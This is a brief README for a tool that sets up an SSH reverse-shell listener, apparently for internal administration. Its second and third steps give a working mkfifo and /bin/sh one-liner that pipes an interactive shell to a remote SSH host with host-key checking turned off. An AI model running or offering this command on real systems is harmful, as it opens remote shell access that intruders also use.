# SSH Reverse Shell
Scripts to setup a SSH reverse shell listener on a server

1. Setup on the server
    ```bash
    ./ssh-shell.sh -i principal_name
    ```
    ```
    Installing additional authorized principal rshell => principal_name
    ```

2. Listen on the server
    ```bash
    ./ssh-shell.sh
    ```
    ```
    Run the following command on the remote server:
        mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | ssh -o "StrictHostKeyChecking no" -o "UserKnownHostsFile /dev/null" rshell@internal.server.yahoo.com > /tmp/f; rm /tmp/f
    Waiting for connection
    ```

3. Connect from the client
    ```bash
    mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | ssh -o "StrictHostKeyChecking no" -o "UserKnownHostsFile /dev/null" rshell@internal.server.yahoo.com > /tmp/f; rm /tmp/f
    ```
